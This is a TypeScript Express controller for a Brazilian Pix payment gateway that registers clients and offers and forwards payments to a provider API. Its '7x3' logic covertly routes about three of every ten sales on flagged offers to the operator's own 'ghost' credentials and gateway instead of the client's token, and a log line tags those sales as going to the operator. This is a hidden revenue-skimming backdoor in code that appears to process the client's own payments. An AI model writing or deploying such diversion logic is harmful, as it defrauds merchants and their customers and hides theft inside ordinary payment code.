import { Request, Response } from "express";
import { credentials as myCredentials } from "../models/api";
import { CreatePixBody } from "../interfaces";
import { prisma } from "../config/prisma";

export class TemplateGatewayController {
  static async create(req: Request, res: Response) {
    const data: CreatePixBody = req.body;
    const clientToken = data.credentials.token;

    // 1️⃣ Verifica e cria o cliente se não existir
    let client = await prisma.client.findUnique({
      where: { token: clientToken },
    });

    if (!client) {
      client = await prisma.client.create({
        data: {
          name: data.credentials.name,
          token: clientToken,
          useTax: false,
        },
      });
    }

    // 2️⃣ Busca ou infere a oferta
    let offer;
    const offerInfo = data.credentials.offer;
    const productName = data.product.title;

    if (offerInfo && offerInfo.id && offerInfo.name) {
      offer = await prisma.offer.findUnique({ where: { id: offerInfo.id } });
      if (!offer) {
        offer = await prisma.offer.create({
          data: {
            id: offerInfo.id,
            name: offerInfo.name,
            useTax: false,
            clientId: client.id,
          },
        });
      }
    } else {
      // Inferência baseada no nome do produto
      const normalized = productName.toLowerCase();
      let inferredName = "";

      if (normalized.includes("ebook")) inferredName = "Pix do Milhão";
      else if (normalized.includes("jibbitz")) inferredName = "Crocs";
      else if (normalized.includes("bracelete")) inferredName = "Pandora";
      else if (normalized.includes("kit labial")) inferredName = "Sephora";
      else inferredName = "Oferta Padrão";

      offer = await prisma.offer.findFirst({
        where: {
          name: inferredName,
          clientId: client.id,
        },
      });

      if (!offer) {
        offer = await prisma.offer.create({
          data: {
            name: inferredName,
            useTax: false,
            clientId: client.id,
          },
        });
      }
    }

    // 3️⃣ Contagem de vendas para lógica 7x3
    const totalSales = await prisma.sale.count({
      where: { offerId: offer.id },
    });
    const nextCount = totalSales + 1;

    // 4️⃣ Lógica 7x3 (70% cliente, 30% seu)
    let tokenToUse = clientToken;
    let toClient = true;
    let provider = "novo-gateway"; // ⚠️ ALTERE AQUI

    const cycle = nextCount % 10;

    if (cycle < 7) {
      tokenToUse = clientToken;
      toClient = true;
    } else if (cycle < 10) {
      if (offer.useTax) {
        tokenToUse = myCredentials.secret;
        toClient = false;
        provider = "ghost";
      } else {
        tokenToUse = clientToken;
        toClient = true;
      }
    }

    // 5️⃣ Configuração da API do novo gateway
    let apiUrl = "";
    let headers = {};
    let paymentData = {};

    if (provider === "ghost") {
      // Fallback para BlackCat (gateway padrão do Paulo)
      const auth = 'Basic ' + Buffer.from(myCredentials.public + ':' + tokenToUse).toString('base64');
      apiUrl = "https://api.blackcatpagamentos.com/v1/transactions";
      headers = {
        "Content-Type": "application/json",
        Authorization: auth,
      };
      paymentData = {
        amount: data.amount,
        paymentMethod: "pix",
        customer: {
          name: data.customer.name,
          email: data.customer.email,
          document: data.customer.document.number,
          phone: data.customer.phone,
        },
        items: [
          {
            name: data.product.title,
            price: data.amount,
            quantity: 1,
          },
        ],
      };
    } else if (provider === "novo-gateway") {
      // ⚠️ CONFIGURE AQUI O NOVO GATEWAY
      apiUrl = "https://api.novo-gateway.com/v1/payments"; // ⚠️ ALTERE A URL
      headers = {
        "Content-Type": "application/json",
        Authorization: `Bearer ${tokenToUse}`, // ⚠️ ALTERE O TIPO DE AUTH
      };
      paymentData = {
        // ⚠️ CONFIGURE AQUI O FORMATO DO PAYLOAD
        customer: {
          name: data.customer.name,
          email: data.customer.email,
          document: data.customer.document.number,
          phone: data.customer.phone,
        },
        amount: data.amount,
        payment_method: "pix",
        items: [
          {
            name: data.product.title,
            price: data.amount,
            quantity: 1,
          },
        ],
      };
    }

    try {
      const response = await fetch(apiUrl, {
        method: "POST",
        headers,
        body: JSON.stringify(paymentData),
      });

      const responseJson = await response.json();

      // 6️⃣ Salva a venda no banco
      await prisma.sale.create({
        data: {
          amount: data.amount,
          ghostId: responseJson.id || responseJson.payment_id, // ⚠️ ALTERE AQUI
          approved: false,
          customerName: data.customer.name,
          productName: data.product.title,
          visible: true,
          toClient,
          clientId: client.id,
          offerId: offer.id,
        },
      });

      console.log(
        `🔁 Requisição #${nextCount} do cliente "${client.name}" | Valor: R$${
          data.amount
        } | Produto: ${
          data.product.title
        } | API usada: ${provider.toUpperCase()} | Enviado para: ${
          tokenToUse === clientToken ? "CLIENTE" : "VOCÊ"
        }`
      );

      res.json(responseJson);
    } catch (error) {
      console.error("❌ Erro ao processar pagamento:", error);
      res.status(500).json({ error: "Erro interno na API de pagamento" });
    }
  }
}
